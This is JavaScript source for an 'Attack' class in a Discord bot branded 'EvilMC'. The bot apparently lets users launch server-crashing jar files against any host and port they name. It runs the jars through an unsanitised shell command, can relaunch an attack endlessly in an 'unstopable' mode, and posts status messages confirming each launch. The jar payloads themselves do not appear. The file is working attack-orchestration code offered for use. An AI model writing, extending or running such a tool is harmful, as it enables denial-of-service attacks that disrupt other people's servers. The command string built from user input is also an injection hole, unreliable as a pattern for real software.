const Discord = require('discord.js');
const Client = require('./client.js');
const child = require('child_process');
const killPrc = require('tree-kill');

class Attack {
    /**
     * @typedef {{client: Client, interaction: Discord.CommandInteraction, jaroptions: {jarname: string, jarargs: string}, AttacksArray: Discord.Collection<string, Attack>, ownerID: string, msgID: string, embed: Discord.MessageEmbed, host: string, port: string, method: string, unstopable: boolean, crashPrc: child.ChildProcess, pid: Number}} AttackOptions
     * @param {AttackOptions} options 
     */
    constructor(options) {
        this.client = options.client,
            this.interaction = options.interaction,
            this.jaroptions = options.jaroptions,
            this.AttacksArray = options.AttacksArray,
            this.ownerID = options.ownerID,
            this.msgID = options.msgID,
            this.embed = options.embed,
            this.host = options.host,
            this.port = options.port,
            this.method = options.method,
            this.unstopable = options.unstopable,
            this.crashPrc = options.crashPrc,
            this.pid = options.pid

        this.runAttack();
    }

    runJar() {      
        let crash = child.exec(`java -jar jars/${this.jaroptions.jarname} ${this.jaroptions.jarargs}`, { detached: true }, (error, stdout, stderr) => {
            if (stderr) {
                console.log(`StdErr: ${stderr}`);
                return;
            }
            console.log(`An attack has been launched: ${this.jaroptions.jarname}`)
            console.log(`[Attack log] ${stdout}`);
        })

        this.crashPrc = crash;
        this.pid = crash.pid;

        if (this.unstopable) {
            crash.on("exit", (code, signal) => {
                this.runJar();
            })
        }
    }

    runAttack() {
        this.runJar();

        this.embed = new Discord.MessageEmbed()
            .setColor('RANDOM')
            .setFooter({
                text: `${this.interaction.guild.name} | EvilMC`,
                iconURL: this.client.user.avatarURL({ dynamic: true })
            });

        let runembed;

        if (this.unstopable == false) {
            runembed = this.embed.setDescription(`**► Method: ${this.method}** \n \n **► Information** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► The attack has been launched! ✅ \n ► For 60 seconds!!\n ☆ Made with ♥ by DesConnet ☆`);

            this.interaction.reply({ embeds: [runembed] })

            setTimeout(() => this.stopAttack(), 60000)
        } else {
            runembed = this.embed.setDescription(`**► Method: ${this.method}** \n \n **► Information** \n IP: ${this.host} \n Port: ${this.port} \n \n  ► The attack has been launched! ✅ \n ► Until you click to stop!!\n ☆ Made with ♥ by DesConnet ☆`);

            const stopBtn = new Discord.MessageButton()
                .setCustomId("stopAttack")
                .setLabel("Stop")
                .setStyle("DANGER");

            this.interaction.reply({ embeds: [runembed], components: [new Discord.MessageActionRow({components: [stopBtn]})], fetchReply: true}).then((msg) => {
                this.msgID = msg.id;
            })
        }
    };

    stopAttack() {
        killPrc(this.pid);
        const endembed = this.embed.setDescription(`**► Method: ${this.method}** \n \n **► Information** \n IP: ${this.host} \n Port: ${this.port} \n \n ► Attack completed\n ☆ Made with ♥ by DesConnet ☆`);
        this.interaction.editReply({ embeds: [endembed], components: [] });
        this.crashPrc.removeAllListeners();
        this.AttacksArray.delete(this.host, this);
    };
}

module.exports = Attack;
